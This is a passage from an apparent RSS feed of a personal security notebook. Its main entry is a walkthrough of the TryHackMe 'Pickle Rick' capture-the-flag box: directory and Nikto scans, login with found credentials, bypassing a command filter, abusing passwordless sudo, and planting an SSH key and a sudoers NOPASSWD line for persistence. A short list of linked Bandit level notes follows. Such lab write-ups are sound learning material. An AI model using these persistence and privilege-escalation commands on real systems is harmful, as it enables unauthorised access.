&lt;p&gt;At this point I’m basically stuck, so I decide to see if I can get a hint by (partially!) reading &lt;a href=&quot;https://razrexe.medium.com/tryhackme-pickle-rick-ctf-walkthrough-9ed36eff17fe&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;someone else’s walk-through&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;. Most of the initial recon in that walk-through (I only scanned down that far) aligns with what I’ve already done, but it mentions two tools I’ve not yeat heard of — dirb (which looks like &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/gobuster&quot; class=&quot;internal&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt; but possibly more straight-forward) and &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/nikto&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/nikto&quot;&gt;Nikto&lt;/a&gt; (which I know &lt;em&gt;of&lt;/em&gt; but not &lt;em&gt;about&lt;/em&gt;). So let’s try those!&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;dirb&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; http://10.10.158.139&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;The dirb command finds everything that &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/gobuster&quot; class=&quot;internal&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt; did, as well as a robots.txt file. This file contains a single “word”: &lt;code&gt;Wubbalubbadubdub&lt;/code&gt;. That doesn’t mean anything to me really (maybe it’s something that Rick would say), but maybe there will be a password field that I could try it out in…&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;nikto&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -host&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.10.158.139&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/nikto&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/nikto&quot;&gt;Nikto&lt;/a&gt; is a scanner for common web vulnerabilities. A couple of interesting things pop out from the scanning of the target system:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Despite the simple page, it looks like the server is running &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/php&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/php&quot;&gt;PHP&lt;/a&gt;. So if I can figure out how to upload something, I’ve got a good shot at popping a reverse shell.&lt;/li&gt;
&lt;li&gt;There’s a /login.php file. Now THAT looks interesting!&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;flag-1&quot;&gt;Flag 1&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#flag-1&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Let’s check out /login.php. This looks like a pretty straight-forward login page. No special headers show up when intercepting the response in &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/burp-suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/burp-suite&quot;&gt;Burp Suite&lt;/a&gt;, and again no JavaScript outside of the standard jQuery and Bootstrap libraries is loaded.&lt;/p&gt;
&lt;p&gt;Let’s try R1ckRul3s:Wubbalubbadubdub for our username:password.&lt;/p&gt;
&lt;p&gt;And, with a redirect to /portal.php, we’re in!&lt;/p&gt;
&lt;p&gt;Let’s poke around here a bit.&lt;/p&gt;
&lt;p&gt;All of the links on this page &lt;em&gt;except&lt;/em&gt; for the first one (“Commands”) go to /denied.php. That page again doesn’t include anything interesting (jQuery, Bootstrap, blah blah blah).&lt;/p&gt;
&lt;p&gt;So all we’ve got is the mysterious “Command Panel”. There is also an HTML comment in the source of /portal.php with what &lt;em&gt;looks&lt;/em&gt; like a base64-encoded string in it. But feeding this to &lt;code&gt;base64 -d&lt;/code&gt; just results in an &lt;code&gt;invalid input&lt;/code&gt; error.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Let’s turn back to “Command Panel” and see what that does. Typing in ls reveals what looks like a listing of the website root directory! Two new files here:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/Sup3rS3cretPickl3Ingred.txt&lt;/li&gt;
&lt;li&gt;/clue.txt&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Viewing /Sup3rS3cretPickl3Ingred.txt revels the first flag.&lt;/p&gt;
&lt;h2 id=&quot;flag-2&quot;&gt;Flag 2&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#flag-2&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Let’s continue poking around. Before we go back to /portal.php, let’s take a look at /clue.txt.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;/clue.txt&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;/clue.txt&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span&gt;Look around the file system for the other ingredient.&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Well, thank you Captain Obvious.&lt;/p&gt;
&lt;p&gt;Let’s see what we can do with the “Command Panel”.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;cat Sup3rS3cretPickl3Ingred.txt&lt;/code&gt; reveals that &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/cat&quot; class=&quot;internal&quot; data-slug=&quot;spells/cat&quot;&gt;cat&lt;/a&gt; is disabled.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ls /&lt;/code&gt; reveals that we can list things outside of the webroot.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ls /home&lt;/code&gt; reveals two users: rick and ubuntu (so trying to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/ssh&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/ssh&quot;&gt;SSH&lt;/a&gt; in as R1ckRul3s wouldn’t have worked anyway).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ls -la /home/rick&lt;/code&gt; reveals a &lt;code&gt;second ingredients&lt;/code&gt; file… But no ~/.ssh directory! Damnit.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ls -la /home/ubuntu&lt;/code&gt; &lt;em&gt;does&lt;/em&gt; reveal a ~/.ssh directory, but we can’t actually descend into it.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Alright, so &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/cat&quot; class=&quot;internal&quot; data-slug=&quot;spells/cat&quot;&gt;cat&lt;/a&gt; is disabled. But can I get at it another way? &lt;code&gt;bash -c &quot;cat Sup3rS3cretPickl3Ingred.txt&quot;&lt;/code&gt; also doesn’t work. Neither does &lt;code&gt;more Sup3rS3cretPickl3Ingred.txt&lt;/code&gt;. But &lt;code&gt;less Sup3rS3cretPickl3Ingred.txt&lt;/code&gt; does work!&lt;/p&gt;
&lt;p&gt;Let’s get that second flag by executing &lt;code&gt;less &quot;/home/rick/second ingredients&quot;&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&quot;flag-3&quot;&gt;Flag 3&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#flag-3&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Let’s get us some filesystem access. On a lark, I tried the command &lt;code&gt;sudo whoami&lt;/code&gt;… And the answer is root! Jackpot!&lt;/p&gt;
&lt;p&gt;Though &lt;code&gt;sudo less /etc/sudoers&lt;/code&gt; reveals that www-data has full &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal&quot; data-slug=&quot;spells/sudo&quot;&gt;sudo&lt;/a&gt; access without a password, so it’s really just as good.&lt;/p&gt;
&lt;p&gt;And… &lt;code&gt;sudo ls -la /home/ubuntu/.ssh&lt;/code&gt; reveals no private &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/ssh&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/ssh&quot;&gt;SSH&lt;/a&gt; key.&lt;/p&gt;
&lt;p&gt;Doing &lt;code&gt;less portal.php&lt;/code&gt; reveals that the mystery string is simply hard-coded, and nothing interesting is hidden in the other &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/php&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/php&quot;&gt;PHP&lt;/a&gt; files.&lt;/p&gt;
&lt;p&gt;I’m not sure where the final flag is, but I have enough access now to pop a full root shell. Unfortunately, I can’t seem to start &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/netcat&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/netcat&quot;&gt;nc&lt;/a&gt; through the “Command Panel”, so we’ll just do this the noisy way.&lt;/p&gt;
&lt;p&gt;First, on my local system create a new temporary &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/ssh&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/ssh&quot;&gt;SSH&lt;/a&gt; key pair using &lt;code&gt;ssh-keygen -f ~/id_rsa&lt;/code&gt;. Then, enter the following commands in the “Command Panel”:&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; bash&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -c&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;echo &quot;$CONTENTS_OF_TEMPORARY_ID_RSA_PUB_KEY&quot; &gt;&gt; /home/ubuntu/.ssh/authorized_keys&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&#039;&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; chown&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; ubuntu.ubuntu&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /home/ubuntu/.ssh/authorized_keys&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; chmod&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 600&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /home/ubuntu/.ssh/authorized_keys&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; bash&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -c&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;echo &quot;ubuntu ALL=(ALL) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&#039;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;(Here &lt;code&gt;$CONTENTS_OF_TEMPORARY_ID_RSA_PUB_KEY&lt;/code&gt; is the contents of &lt;code&gt;~/id_rsa.pub&lt;/code&gt;.)&lt;/p&gt;
&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;
&lt;div class=&quot;callout-title&quot;&gt;
                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;
                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;NOTE&lt;/p&gt;&lt;/div&gt;
                  
                &lt;/div&gt;
&lt;div class=&quot;callout-content&quot;&gt;
&lt;p&gt;The “Command Panel” does a simple string match looking for “cat”, “more”, “tail”, “nano”, “vim”, and “vi”. The last one in particular can be a little problematic… You may have to run ssh-keygen a couple of times to get a key without “vi” as a substring.)&lt;/p&gt;
&lt;/div&gt;
&lt;/blockquote&gt;
&lt;p&gt;We can now access the box directly over &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/ssh&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/ssh&quot;&gt;SSH&lt;/a&gt; as the ubuntu user, and from there elevate to root using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal&quot; data-slug=&quot;spells/sudo&quot;&gt;sudo&lt;/a&gt;.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;ssh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -i&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; ~/id_rsa&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -F&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /dev/null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;    -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; IdentityAgent=none&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; ubuntu@10.10.158.139&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Though it turns out that I didn’t have to go this far… The third flag is just in the &lt;code&gt;.bash_history&lt;/code&gt; file of the ubuntu user.&lt;/p&gt;
&lt;p&gt;Oh well, I still got a root shell (albeit in a totally noisy fashion).&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 3 h 11 min&lt;/p&gt;</description>
    <pubDate>Sun, 10 Oct 2021 00:00:00 GMT</pubDate>
  </item><item>
    <title>Bandit</title>
    <link>https://cardboard-iguana.com/grimoire/tales/2020-07-27-bandit</link>
    <guid>https://cardboard-iguana.com/grimoire/tales/2020-07-27-bandit</guid>
    <description>&lt;h2 id=&quot;bandit-2&quot;&gt;Bandit 2&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#bandit-2&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;how-to-read-a-file-beginning-with-a-dash&quot; data-block=&quot;&quot; data-embed-alias=&quot;undefined&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/how-to-read-a-file-beginning-with-a-dash&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/how-to-read-a-file-beginning-with-a-dash&quot;&gt;Transclude of how-to-read-a-file-beginning-with-a-dash&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2 id=&quot;bandit-13&quot;&gt;Bandit 13&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#bandit-13&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;xxd&quot; data-block=&quot;&quot; data-embed-alias=&quot;undefined&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/xxd&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/xxd&quot;&gt;Transclude of xxd&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2 id=&quot;bandit-16&quot;&gt;Bandit 16&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#bandit-16&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;how-to-send-a-command-using-openssl&quot; data-block=&quot;&quot; data-embed-alias=&quot;undefined&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/how-to-send-a-command-using-openssl&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/how-to-send-a-command-using-openssl&quot;&gt;Transclude of how-to-send-a-command-using-openssl&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2 id=&quot;bandit-26&quot;&gt;Bandit 26&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#bandit-26&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;more&quot; data-block=&quot;&quot; data-embed-alias=&quot;undefined&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/more&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/more&quot;&gt;Transclude of more&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;how-to-get-a-shell-from-vim&quot; data-block=&quot;&quot; data-embed-alias=&quot;undefined&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/how-to-get-a-shell-from-vim&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/how-to-get-a-shell-from-vim&quot;&gt;Transclude of how-to-get-a-shell-from-vim&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;</description>
    <pubDate>Mon, 27 Jul 2020 00:00:00 GMT</pubDate>
  </item>
    </channel>
  </rss>